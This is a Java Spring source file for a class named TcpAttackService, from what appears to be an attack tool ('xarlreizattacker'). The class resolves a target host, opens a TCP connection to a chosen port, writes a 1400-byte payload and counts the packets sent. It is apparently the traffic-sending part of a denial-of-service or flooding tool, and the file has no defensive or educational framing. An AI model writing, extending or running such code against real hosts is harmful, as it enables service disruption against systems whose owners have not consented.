package com.onzecincocincodoet.xarlreizattacker.service.impl;

import com.onzecincocincodoet.xarlreizattacker.service.AttackService;
import com.onzecincocincodoet.xarlreizattacker.util.NetworkUtils;
import org.springframework.stereotype.Service;

import java.net.InetAddress;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicLong;

@Service
public class TcpAttackService implements AttackService {
    private final AtomicLong packetsSent = new AtomicLong(0);

    @Override
    public void sendPackets(String target, int port) {
        byte[] data = new byte[1400];
        try {
            InetAddress address = NetworkUtils.resolveAddress(target);
            try (Socket socket = new Socket(address, port)) {
                socket.getOutputStream().write(data);
                packetsSent.incrementAndGet();
            }
        } catch (Exception e) {
            throw new RuntimeException("Failed to send TCP packet", e);
        }
    }

    @Override
    public long getPacketsSent() {
        return packetsSent.get();
    }
}


